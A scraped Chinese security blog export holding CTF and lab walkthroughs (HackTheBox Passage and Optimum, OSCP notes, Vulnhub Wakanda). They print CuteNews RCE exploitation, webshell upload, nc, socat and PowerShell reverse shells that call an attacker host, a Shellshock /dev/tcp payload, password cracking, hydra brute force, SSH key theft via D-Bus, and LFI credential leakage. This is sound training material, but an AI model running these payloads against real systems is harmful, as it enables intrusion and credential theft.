10.129.104.160Host is up (0.25s latency).Not shown: 997 closed portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 17:eb:9e:23:ea:23:b6:b1:bc:c6:4f:db:98:d3:d4:a1 (RSA)| 256 71:64:51:50:c3:7f:18:47:03:98:3e:5e:b8:10:19:fc (ECDSA)|_ 256 fd:56:2a:f8:d0:60:a7:f1:a0:a1:47:a4:38:d6:a8:a1 (ED25519)80/tcp open http Apache httpd 2.4.18 ((Ubuntu))|_http-title: Passage News10621/tcp filtered unknownService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 258.09 seconds 页面打开为一个新闻界面，查看页面源码 12 By admin By Kim Swift 页面源码中包含passage.htb, admin:nadav@passage.htb, paul@passage.htb,kim@example.com, sid@example.com, 推断可能存在nadav, paul等用户。 1Powered by CuteNews 2.1.2 © 2002–2021 CutePHP. 从http://10.129.104.160/CuteNews/index.php页面信息可以发现80端口网页使用的模板是CuteNews 2.1.2版本，Google发现存在RCE可以直接利用：https://www.exploit-db.com/exploits/48800。 0x01 获得foothold利用exp脚本执行，可以直接获得www-data权限 1234567891011121314151617181920212223242526272829303132333435363738394041424344 _____ __ _ __ ___ ___ ___ / ___/_ __/ /____ / |/ /__ _ _____ |_ | < / |_ | / /__/ // / __/ -_) / -_) |/|/ (_-< / __/_ / / / __/ \\___/\\_,_/\\__/\\__/_/|_/\\__/|__,__/___/ /____(_)_(_)____/ ___ _________ / _ \\/ ___/ __/ / , _/ /__/ _/ /_/|_|\\___/___/ [->] Usage python3 expoit.pyEnter the URL> http://10.129.90.135================================================================Users SHA-256 HASHES TRY CRACKING THEM WITH HASHCAT OR JOHN================================================================7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e14bdd0a0bb47fc9f66cbf1a8982fd2d344d2aec283d1afaebb4653ec3954dff88e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cdf669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca4db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9cc=============================================================================================Registering a users=============================[+] Registration successful with username: ZmgRB8hLtC and password: ZmgRB8hLtC=======================================================Sending Payload=======================================================signature_key: 1e55ed33ba7b8dd6ad8b92b3433074d7-ZmgRB8hLtCsignature_dsi: 802a15242f360a141cc8c982deb26cc3logged in user: ZmgRB8hLtC============================Dropping to a SHELL============================command > iduid=33(www-data) gid=33(www-data) groups=33(www-data) 尝试使用python -c \"import pty; pty.spawn('/bin/bash')\"生成标准的bash ，发现行不通 ，exp脚本生成的bash不支持部分回显。进一步发现/CuteNews/uploads路径，可以看到上传的文件。尝试生成webshell通过SimpleHTTPServer传递。 12345678910command > pwd/var/www/html/CuteNews/uploadscommand > ls -latotal 20drwxrwxrwx 2 www-data www-data 4096 Feb 26 07:43 .drwxrwxr-x 9 www-data www-data 4096 Jun 18 2020 ..-rw-r--r-- 1 www-data www-data 39 Feb 26 07:43 avatar_36fUuEQWLg_36fUuEQWLg.php-rw-r--r-- 1 www-data www-data 1115 Aug 31 13:48 avatar_egre55_ykxnacpt.php-rw-r--r-- 1 www-data www-data 1116 Aug 31 14:55 avatar_hacker_jpyoyskt.php 将/usr/share/seclists/Web-Shells/FuzzDB/cmd-simple.php复制到当前目录，使用python的简易HTTP服务上传webshell。 1234567891011command > wget http://10.10.14.29:8000/exp.phpcommand > ls -latotal 24drwxrwxrwx 2 www-data www-data 4096 Feb 26 07:51 .drwxrwxr-x 9 www-data www-data 4096 Jun 18 2020 ..-rw-r--r-- 1 www-data www-data 39 Feb 26 07:43 avatar_36fUuEQWLg_36fUuEQWLg.php-rw-r--r-- 1 www-data www-data 1115 Aug 31 13:48 avatar_egre55_ykxnacpt.php-rw-r--r-- 1 www-data www-data 1116 Aug 31 14:55 avatar_hacker_jpyoyskt.php-rw-r--r-- 1 www-data www-data 328 Feb 26 07:49 exp.php 通过webshell反向连接主机http://passage.htb/CuteNews/uploads/exp.php?cmd=nc%20-e%20/bin/bash%2010.10.14.29%204444 123456┌──(root💀kali)-[/home/fnut/passage]└─# nc -nvlp 4444listening on [any] 4444 ...connect to [10.10.14.29] from (UNKNOWN) [10.129.104.160] 59634iduid=33(www-data) gid=33(www-data) groups=33(www-data) 使用python3 -c \"import pty; pty.spawn('/bin/bash')\"生成标准的shell。 12python3 -c \"import pty;pty.spawn('/bin/bash')\"www-data@passage:/var/www/html/CuteNews/uploads$ 0x02 权限提升-user在/home目录下发现两个用户nadav/paul 1234567www-data@passage:/home$ ls -lals -latotal 16drwxr-xr-x 4 root root 4096 Jul 21 2020 .drwxr-xr-x 23 root root 4096 Jul 21 2020 ..drwxr-x--- 17 nadav nadav 4096 Feb 2 17:24 nadavdrwxr-x--- 16 paul paul 4096 Sep 30 05:08 paul 刚才RCE的payload中/CuteNews/cdata/users/lines发现的hashes如下 12345678910Enter the URL> http://10.129.104.160================================================================Users SHA-256 HASHES TRY CRACKING THEM WITH HASHCAT OR JOHN================================================================7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e14bdd0a0bb47fc9f66cbf1a8982fd2d344d2aec283d1afaebb4653ec3954dff88e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cdf669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca4db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9cc================================================================ 使用hashcat破解得到两个密码，第二个密码为paul密码 123456784db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9cc:egre55e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd:atlanta1www-data@passage:/home$ su paulsu paulPassword: atlanta1paul@passage:/home$ 为了获得完整的交互式shell， 我们有两种方法。第一种就是通过paul文件夹下.ssh隐藏目录中的authorized_keys，添加自己主机ssh公钥可以直接ssh连到靶机。或者也可以复制id_rsa私钥，复制到本地，使用ssh -i id_rsa paul@10.129.x.x来连接到靶机。 1234ssh-keygen -t rsa -C xxxxcat ~/.ssh/id_rsa.pubecho \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDG5YNTqrYspjD/1uwVgou+24/XTFvH2lzlM1NyYrR5DUrffFGBduqCgxf9IOACLK4XHCtw4bCritViKFaud7GRcTJLCL+YjTQ1DLGts9srkSpvXpJb7s22arNmWMYhiipJ2BIjfpAkw/rMsA6J7KQ6xWEpfsmlkU0VcAFZySZjiuH65c7eamA1Rq/FRl+uFebEFgaR9GkHpMG7dZ/2J49Z/bzUyAr4VTz8xFOKS0Tz7Y4p2z4hYHLc4+wVk54DQLdAskkRYf8oRIZl0xUoV4D11ioFrTN0VlOuZw4ILOlDRg5XU56tzAt7qY6GrCnrVnb1BwYrcf4kZ2rlGCZiDBEdTStqj/UB3gEut6IXrSw4bJf3/sHqIE5R8HAMRGcqrkK0Zh/jcNDkxYehNj7X8ZgRxzGq1n4+yVzah239EotYkXJO6MqagVevATdr/x/Joy4+JoI4TPXJ8bt3hYIWzxImbz3Ek1pbcJTYbuXhDm9hidfbOpgDGPFt1q6rWO9fI5M=\" >>authorized_keys 第二种就是ippsec大神的进化反弹shell的方法，先ctrl+Z将反弹shell的任务切换到后台运行，然后使用以下命令来让反弹shell获得TAB键等更方便操作的功能。 1stty raw -echo;fg 并且我们发现.ssh/authorized_keys文件中包含有nadav用户的公钥 12paul@passage:~/.ssh$ cat authorized_keys ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzXiscFGV3l9T2gvXOkh9w+BpPnhFv5AOPagArgzWDk9uUq7/4v4kuzso/lAvQIg2gYaEHlDdpqd9gCYA7tg76N5RLbroGqA6Po91Q69PQadLsziJnYumbhClgPLGuBj06YKDktI3bo/H3jxYTXY3kfIUKo3WFnoVZiTmvKLDkAlO/+S2tYQa7wMleSR01pP4VExxPW4xDfbLnnp9zOUVBpdCMHl8lRdgogOQuEadRNRwCdIkmMEY5efV3YsYcwBwc6h/ZB4u8xPyH3yFlBNR7JADkn7ZFnrdvTh3OY+kLEr6FuiSyOEWhcPybkM5hxdL9ge9bWreSfNC1122qq49d nadav@passage 所以我们可以直接从paul用户使用ssh切换到nadav用户 1234567paul@passage:~/.ssh$ ssh nadav@10.129.104.160The authenticity of host '10.129.104.160 (10.129.104.160)' can't be established.ECDSA key fingerprint is SHA256:oRyj2rNWOCrVh9SCgFGamjppmxqJUlGgvI4JSVG75xg.Are you sure you want to continue connecting (yes/no)? yesWarning: Permanently added '10.129.104.160' (ECDSA) to the list of known hosts.Last login: Mon Aug 31 15:07:54 2020 from 127.0.0.1nadav@passage:~$ 0x03 权限提升-root查看nadav用户所属的groups组 12nadav@passage:~$ groupsnadav adm cdrom sudo dip plugdev lpadmin sambashare 查看当前运行的进程， 发现运行了一个dbus进程 1message+ 693 1 0 07:14 ? 00:00:00 /usr/bin/dbus-daemon --system 搜索D-bus相关漏洞，发现如下文章，可以利用D-bus来覆盖或者获取某些root文件的信息 1https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/ 尝试使用D-bus漏洞，重写/etc/passwd文件(不可行)。因为即使添加了无密码root权限用户，也无法使用ssh登录 1gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /home/nadav/passwd /etc/passwd true 尝试重写公钥文件也不可行，ssh登录强制要求输入密码，只能偷取私钥文件 1gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/.ssh/id_rsa /tmp/root_keys true 利用获取到的ssh私钥连接 1234567ssh -i root_id_rsa root@x.x.x.x┌──(potato㉿kali)-[/home/fnut/passage]└─$ ssh -i id_rsa_root root@10.129.104.160Last login: Mon Aug 31 15:14:22 2020 from 127.0.0.1root@passage:~# iduid=0(root) gid=0(root) groups=0(root) Done!~ document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://yoursite.com/categories/Hackthebox/"}],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://yoursite.com/tags/Hackthebox/"}]},{"title":"Hackthebox--Optimum","slug":"Hackthebox--Optimum","date":"2021-02-25T13:45:54.763Z","updated":"2021-02-25T13:47:22.958Z","comments":true,"path":"2021/02/25/Hackthebox--Optimum/","link":"","permalink":"http://yoursite.com/2021/02/25/Hackthebox--Optimum/","excerpt":"0x00 Powershell windows提权 Github相关项目123Empire https://github.com/EmpireProject/Empirenishang https://github.com/samratashok/nishangsherlock https://github.com/rasta-mouse/Sherlock 0x01 漏洞利用 payload1:powershell反向连接","text":"0x00 Powershell windows提权 Github相关项目123Empire https://github.com/EmpireProject/Empirenishang https://github.com/samratashok/nishangsherlock https://github.com/rasta-mouse/Sherlock 0x01 漏洞利用 payload1:powershell反向连接 1/?search=%00{.exec|c:Windows\\SysNative\\WindowsPowershell\\v1.0\\powershell.exe IEX(New-Object Net.Webclient).downloadString('http://10.10.14.126:8000/Invoke-PowerShellTcp.ps1').} payload2:Sherlock.ps1查找相关漏洞 1IEX(New-Object Net.Webclient).downloadString('http://10.10.14.126:8000/Sherlock.ps1') payload3:提权+反向shell修改Invoke-PowershellTcp.ps1监听端口，然后修改Invoke-MS16032.ps1中内容，使用payload1进行调用 0x02 Powershell相关搜索命令 powershell搜索文件Get-ChildItem -Recurse -Include ‘*.txt’ document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://yoursite.com/categories/Hackthebox/"}],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://yoursite.com/tags/Hackthebox/"}]},{"title":"OSCP笔记","slug":"OSCP笔记","date":"2021-02-24T16:26:14.773Z","updated":"2021-02-24T16:35:11.880Z","comments":true,"path":"2021/02/25/OSCP笔记/","link":"","permalink":"http://yoursite.com/2021/02/25/OSCP笔记/","excerpt":"0x00 基础命令123456mkdir -p test/{recon,exploit,report}manaproposwhichlocatefind 0x01 基础服务1、SSH 12345sudo systemctl start sshsudo ss -antlp |grep sshdsudo systemctl enable ssh","text":"0x00 基础命令123456mkdir -p test/{recon,exploit,report}manaproposwhichlocatefind 0x01 基础服务1、SSH 12345sudo systemctl start sshsudo ss -antlp |grep sshdsudo systemctl enable ssh 2、HTTP 12345sudo systemctl start apache2sudo ss -antlp |grep apachesudo systemctl enable apache2 3、枚举服务 1systemctl list-unit-files 0x02 搜索、安装、移除工具1、apt相关 123456apt updateapt upgradeapt-cache search //搜索apt相关信息apt show apt installapt remove --purge //--purge表示完全移除 2、dpkg(离线安装) 1sudo dpkg -i man-db_2.7.0.2-5_amd64.deb 0x03 Bash1、系统环境变量 1234567echo $PATHecho $USERecho $PWDecho $HOMEexport //可以定义环境变量env //查看系统环境变量$$ //当前shell的进程编号 2、history 12345history //查看历史执行命令- !1 //执行histroy中的第n行命令- !! //执行history中的最后一条- ./bash_history //保存至用户home此文件- Ctrl+R //搜索 3、管道和重定向 12345678> //重定向，原文件内容会被替换echo \"Kali Linux is an open source project\" > redirection_test.txt>> //附加到原文件内容之后< //0/STDIN //系统定义的相关描述符1/STDOUT2/STDERR| 4、搜索和使用 需要更多地了解正则表达式 123grep-E //可以筛选多个规则grep -E 'A|B' 1234sed //对文本按照规则进行编辑kali@kali:~$ echo \"I need to try hard\" | sed 's/hard/harder/'I need to try harder 12345cut //对文本按照规则进行提取kali@kali:~$ echo \"I hack binaries,web apps,mobile apps, and just about anything else\"| cut -f 2 -d \",\"web apps 1234awk //对文本进行处理和提取kali@kali:~$ echo \"hello::there::friend\" | awk -F \"::\" '{print $1, $3}'hello friend 12345headtailwc -l //显示文件中总计的行数sortuniq -c //统计出现次数 5、文本编辑器 12nanovi 6、文件比较 12comm filea fileb //文件比较comm -12 //仅输出两文件中相同部分 12diff -cdiff -u //对比并合并显示 123456vimdiff• do: gets changes from the other window into the current one• dp: puts the changes from the current window into the other one• ]c: jumps to the next change• [c: jumps to the previous change• Ctrl+w: switches to the other split window 7、进程处理 12345678使用&来让进程在后台运行kali@kali:~$ ping -c 400 localhost > ping_results.txt &列出当前运行的任务jobs在前台/后台继续运行任务中的进程fg/bg 123ps -ef //e选择所有进程，f显示全格式列表-C //按照指定的名称筛选 12kill+pidkill -9 -1 //All processes with pid larger than 1 will be signaled 8、文件和命令监控 123tail-f //动态显示文件最后指定行的输出-nX //输出最后X行，默认为10行 12watch-n 9、下载文件 12wget-O 12curl-o 1234axel-n //指定下载的连接数-a //详细进度-o 10、定制Bash环境 1234Bash historyexport HISTCONTROL=ignoredups //从bash历史记录中移除重复项export HISTIGNORE=\"&:ls:[bf]g:exit:history\" //忽略特定指令export HISTTIMEFORMAT='%F %T ' //%F-年月日，%T-24小时制 123aliasalias lsa='ls -la'unalias //重置alias 12/etc/bash.bashrc //全局bash设定~/.bashrc //特定用户的bash设定 0x04 相关工具1、Netcat 12345678910111213141516#监听端口nc -nv x.x.x.x y nc -nvlp 4444 #传输文件nc -nv 10.11.0.22 4444 < /usr/share/windows-resources/binaries/wget.exenc -nlvp 4444 > incoming.exe#执行特定程序nc -nlvp 4444 -e cmd.exe-n //跳过DNS域名解析-v //添加相关参数-目的地址，目的端口号-l //创建监听器-p //指定相关端口-e //成功连接后执行特定程序 shell 123A获取到B的shellB: nc -nlvp 4444 -e cmd.exeA: nc -nv 10.11.0.22 4444 反向shell 12B: nc -nlvp 4444A: nc -nv 10.11.0.22 4444 -e /bin/bash //重点 2、Socat 12sudo socat TCP4-LISTEN:443 STDOUT- //在本地STDIN和远程直接传输数据 文件传输 12A: sudo socat TCP4-LISTEN:443,fork file:secret_passwords.txtB: socat TCP4:10.11.0.4:443 file:received_secret_passwords.txt,create 反向shell 12B: socat -d -d TCP4-LISTEN:443 STDOUT //-d -d表示显示fatal, error, warning和notice信息A: socat TCP4:10.11.0.22:443 EXEC:/bin/bash //EXEC:类似于nc中的nc -e socat加密shell 123456789101112131415161718192021222324252627加密流量传输可以逃避IDS检测，并保持传输数据机密性openssl相关参数：req //初始化新证书申请流程-newkey //生成新的私钥rsa:2048 //使用2048位的RSA进行加密-nodes //存储私钥不使用密码保护-keyout //将秘钥保存到指定文件-x509 //输出自签名证书而不是证书请求-days //设置有效期天数-out //保存证书到指定文件#生成证书文件openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt#合并证书文件cat bind_shell.key bind_shell.crt > bind_shell.pem#创建监听端口并指定证书sudo socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bashOPENSSL-LISTEN //在443端口创建监听cert=bind_shell.pem //指定证书文件verify=0 //禁用SSL验证fork //创建子进程来执行指定程序#创建SSL连接socat - OPENSSL:10.11.0.4:443,verify=0 3、Powershell/Powercat 12Set-ExecutionPolicy Unrestricted //设置执行策略为不约束Get-ExecutionPolicy //获取执行策略 文件传输 12powershell -c \"(new-object System.Net.WebClient).DownloadFile('http://10.11.0.4/wget.exe','C:\\Users\\offsec\\Desktop\\wget.exe')\" 0xFinal Exercise 2.4.3.4 3.1.3.2 3.2.5.1 3.3.5.1 3.5.3.1 3.6.3.1 3.7.2.1 3.8.3.1 3.9.3.1 4.2.4.1 0xEnv 10.11.1.7112nmap -sV -O -F --version-light 10.10.10.3nmap -sC -sV -oA nmap x.x.x.x 80端口，nikto扫描可以发现/cgi-bin/admin.cgi接口存在破壳漏洞，可以直接获得www-data权限的shell 1curl -A \"() { :; }; echo; /bin/bash -i >& /dev/tcp/192.168.119.186/4444 0>&1\" http://10.11.1.71/cgi-bin/admin.cgi Linux提权相关 https://www.cnblogs.com/Cl0wn/p/12911902.html https://mp.weixin.qq.com/s/uk0qSfGA4yaj7ioQYmln-g https://github.com/jondonas/linux-exploit-suggester-2 ps -aux | grep root 列出以root身份运行的服务 通过 /etc/passwd 获取了用户名之后，可以去访问特定的 /home/用户名/.bash_history 文件，看看 history 里面有没有泄露密码 1gibson:x:1000:1000:gibson,,,:/home/gibson:/bin/bash 拿到www-data的shell之后无法su，需要使用python生成一个bash 1234567891011www-data@alpha:/home/gibson$ echo \"import pty; pty.spawn('/bin/bash')\" > /tmp/asdf.py /tmp/asdf.pywww-data@alpha:/tmp$ python asdf.pypython asdf.pywww-data@alpha:/tmp$ ididuid=33(www-data) gid=33(www-data) groups=33(www-data)www-data@alpha:/tmp$ susuPassword: 或者直接 1python3 -c \"import pty; pty.spawn('/bin/bash')\" 目前就是需要拿到gibson的权限（疑似Gibson与root存在密码重用） 1grep -vE \"nologin|false\" /etc/passwd crontab服务以root权限运行，进一步查看当前进程和服务 12ps auxnetstat -antup 发现内部环回接口绑定了3306，mysql默认端口。密码复用考虑mysql密码，由于网站使用BigtreeCMS搭建，CMS源码中指定./core/config.environment.php 和./core/config.settings.php作为配置文件路径，其中有数据库用户名密码配置。 12# 查看webroot目录grep -Ri DocumentRoot 在目录内文件中查找相关字段 1grep -R '$bigtree\\[\"config\"\\]\\[\"db\"\\]' 发现mysql用户名和密码配置root/zaq1xsw2cde3，使用mysql连接验证是否可用 1mysql -uroot -pzaq1xsw2cde3 -e 'show databases;' searchsploit可以搜索相关漏洞 1searchsploit ossec 查看ssh配置 1grep -v '^#' /etc/ssh/sshd_config | uniq 可以使用hydra来尝试爆破gibson的ssh密码 1234567root@kali:~# hydra -l gibson -p zaq1xsw2cde3 10.11.1.71 ssh Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes. [DATA] max 1 task per 1 server, overall 1 task, 1 login try (l:1/p:1), ~1 try per task [DATA] attacking ssh://10.11.1.71:22/ [22][ssh] host: 10.11.1.71 login: gibson password: zaq1xsw2cde31 of 1 target successfully completed, 1 valid password foundHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-01-18 11:21:40 使用gibson账户ssh到目标靶机，gibson为sudo组用户，可以直接sudo su进行提权。另外，靶机上的ossec存在漏洞也可以利用。 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[{"name":"OSCP","slug":"OSCP","permalink":"http://yoursite.com/categories/OSCP/"}],"tags":[{"name":"OSCP","slug":"OSCP","permalink":"http://yoursite.com/tags/OSCP/"}]},{"title":"Vulnhub靶机渗透——Wakanda","slug":"Vulnhub靶机渗透——Wakanda","date":"2020-06-16T16:26:44.916Z","updated":"2020-06-27T15:18:47.261Z","comments":true,"path":"2020/06/17/Vulnhub靶机渗透——Wakanda/","link":"","permalink":"http://yoursite.com/2020/06/17/Vulnhub靶机渗透——Wakanda/","excerpt":"0x00 前言靶机地址：https://www.vulnhub.com/entry/wakanda-1,251/# 使用VM VirtualBox运行靶机，配置运行kali的VMware和运行靶机的VM VirtualBox均使用桥接网卡模式，这样kali和目的靶机就在同一个局域网中，可以开始后续的测试了。 0x01 目标探测我们先使用ipconfig命令来查看下本地ip，然后再使用netdiscover命令和arp -l命令来探测局域网内有哪些存活的主机。","text":"0x00 前言靶机地址：https://www.vulnhub.com/entry/wakanda-1,251/# 使用VM VirtualBox运行靶机，配置运行kali的VMware和运行靶机的VM VirtualBox均使用桥接网卡模式，这样kali和目的靶机就在同一个局域网中，可以开始后续的测试了。 0x01 目标探测我们先使用ipconfig命令来查看下本地ip，然后再使用netdiscover命令和arp -l命令来探测局域网内有哪些存活的主机。 12345678910root@kali:~# ifconfigeth0: flags=4163 mtu 1500 inet 192.168.199.211 netmask 255.255.255.0 broadcast 192.168.199.255 inet6 fe80::20c:29ff:fef9:c363 prefixlen 64 scopeid 0x20 ether 00:0c:29:f9:c3:63 txqueuelen 1000 (Ethernet) RX packets 570 bytes 187830 (183.4 KiB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 73307 bytes 4399916 (4.1 MiB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0...... kali在eth0上的IP地址和掩码为192.168.199.211/24。netdiscover和arp -l结果如下： 123456789101112131415161718root@kali:~# netdiscover -i eth0Currently scanning: 172.16.28.0/16 | Screen View: Unique Hosts 18 Captured ARP Req/Rep packets, from 11 hosts. Total size: 1080 _____________________________________________________________________________ IP At MAC Address Count Len MAC Vendor / Hostname ----------------------------------------------------------------------------- 192.168.199.1 d4:ee:07:60:2d:18 5 300 HIWIFI Co., Ltd. 192.168.199.122 04:cf:8c:24:ec:b2 3 180 XIAOMI Electronics,CO., 192.168.199.248 08:1f:71:30:18:db 1 60 TP-LINK TECHNOLOGIES CO 192.168.199.105 08:00:27:3c:1e:db 2 120 PCS Systemtechnik GmbH 192.168.199.123 44:23:7c:7b:79:bf 1 60 Beijing Xiaomi Mobile S 192.168.199.151 00:02:ee:90:5c:3d 1 60 Nokia Danmark A/S 192.168.199.167 50:ec:50:39:89:bd 1 60 Beijing Xiaomi Mobile S 192.168.199.183 44:23:7c:6d:18:07 1 60 Beijing Xiaomi Mobile S 192.168.199.201 44:23:7c:84:61:e9 1 60 Beijing Xiaomi Mobile S 192.168.199.188 cc:66:0a:2f:ec:be 1 60 Apple, Inc. 192.168.199.247 a4:cf:12:c6:bd:d3 1 60 Espressif Inc. 1234567891011121314151617root@kali:~# arp-scan -lInterface: eth0, type: EN10MB, MAC: 00:0c:29:f9:c3:63, IPv4: 192.168.199.211Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)192.168.199.1 d4:ee:07:60:2d:18 HIWIFI Co., Ltd.192.168.199.105 08:00:27:3c:1e:db PCS Systemtechnik GmbH192.168.199.105 08:00:27:3c:1e:db PCS Systemtechnik GmbH (DUP: 2)192.168.199.122 04:cf:8c:24:ec:b2 XIAOMI Electronics,CO.,LTD192.168.199.123 44:23:7c:7b:79:bf Beijing Xiaomi Mobile Software Co., Ltd192.168.199.151 00:02:ee:90:5c:3d Nokia Danmark A/S192.168.199.167 50:ec:50:39:89:bd Beijing Xiaomi Mobile Software Co., Ltd192.168.199.201 44:23:7c:84:61:e9 Beijing Xiaomi Mobile Software Co., Ltd192.168.199.188 cc:66:0a:2f:ec:be Apple, Inc.192.168.199.247 a4:cf:12:c6:bd:d3 Espressif Inc.192.168.199.101 12:31:0a:85:a6:09 (Unknown: locally administered)11 packets received by filter, 0 packets dropped by kernelEnding arp-scan 1.9.7: 256 hosts scanned in 2.323 seconds (110.20 hosts/sec). 11 responded 可以看到，除了192.168.199.105 08:00:27:3c:1e:db PCS Systemtechnik GmbH这个ip之外，其他应该都是正常使用的ip，192.168.199.105应该就是我们这次靶机的ip。 0x02 端口/服务扫描先使用nmap扫描靶机开放端口，结果如下： 123456789101112131415root@kali:~# nmap -p- -sV 192.168.199.105Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-17 10:15 EDTNmap scan report for 192.168.199.105Host is up (0.00050s latency).Not shown: 65531 closed portsPORT STATE SERVICE VERSION80/tcp open http Apache httpd 2.4.10 ((Debian))111/tcp open rpcbind 2-4 (RPC #100000)3333/tcp open ssh OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)34509/tcp open status 1 (RPC #100024)MAC Address: 08:00:27:3C:1E:DB (Oracle VirtualBox virtual NIC)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 14.58 seconds 比较明显的是开放了80的web端口和3333的ssh端口，另外还有34509端口比较可疑。网页打开看了一下，是一个振金市场的主页。 使用nikto扫描下网站，看网站是否存在漏洞或者信息泄露： 1234567891011121314151617181920root@kali:~# nikto -h http://192.168.199.105- Nikto v2.1.6---------------------------------------------------------------------------+ Target IP: 192.168.199.105+ Target Hostname: 192.168.199.105+ Target Port: 80+ Start Time: 2020-06-16 12:51:18 (GMT-4)---------------------------------------------------------------------------+ Server: Apache/2.4.10 (Debian)+ The anti-clickjacking X-Frame-Options header is not present.+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type+ No CGI Directories found (use '-C all' to force check all possible dirs)+ Apache/2.4.10 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.+ OSVDB-3233: /icons/README: Apache default file found.+ 7915 requests: 0 error(s) and 6 item(s) reported on remote host+ End Time: 2020-06-16 12:52:17 (GMT-4) (59 seconds)---------------------------------------------------------------------------+ 1 host(s) tested 但是没发现什么有用的信息，于是接着用dirb来暴力枚举下网站目录： 1234567891011121314151617181920root@kali:~# dirb http://192.168.199.105 ----------------- DIRB v2.22 By The Dark Raver ----------------- START_TIME: Tue Jun 16 12:49:43 2020 URL_BASE: http://192.168.199.105/ WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt-----------------GENERATED WORDS: 4612 ---- Scanning URL: http://192.168.199.105/ ----+ http://192.168.199.105/admin (CODE:200|SIZE:0) + http://192.168.199.105/backup (CODE:200|SIZE:0) + http://192.168.199.105/index.php (CODE:200|SIZE:1527) + http://192.168.199.105/secret (CODE:200|SIZE:0) + http://192.168.199.105/server-status (CODE:403|SIZE:303) + http://192.168.199.105/shell (CODE:200|SIZE:0) -----------------END_TIME: Tue Jun 16 12:49:47 2020DOWNLOADED: 4612 - FOUND: 6 挨个访问了下，似乎没什么有用的东西。不过查看网页源码的过程中，发现一条有趣的注释： 1Fr/a> lang代表可以切换的语言，尝试直接在url中包含lang参数？lang=fr，发现页面中间的部分语言切换成了法语。这里可能存在本地文件包含(LFI)和远程文件包含(RFI)漏洞。 0x03 LFI获取源码考虑到可能存在LFI或者RFI漏洞，因为除了index.php其他的页面似乎没有什么可以突破的点，尝试用php伪协议读取下index.php的源码： 1http://192.168.199.105/?lang=php://filter/convert.base64-encode/resource=index 这里我们获取到的是base64之后的页面源码，解密后在开头部分发现一部分php源码，包含了一个密码： 12345678 另外原始网页源码中还包含了一部分明文，标明了作者是mamadou： 12345Vibranium MarketHomeComing soonMade by@mamadou 联想到之前nmap扫描到的ssh服务，尝试用这个用户名mamadou和密码Niamey4Ever227!!!登录下： 1234567891011121314root@kali:~# ssh mamadou@192.168.199.105 -p 3333mamadou@192.168.199.105's password: The programs included with the Debian GNU/Linux system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright.Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extentpermitted by applicable law.Last login: Sat Feb 29 14:22:02 2020 from kali.lanPython 2.7.9 (default, Jun 29 2016, 13:08:31) [GCC 4.9.2] on linux2Type \"help\", \"copyright\", \"credits\" or \"license\" for more information.>>> 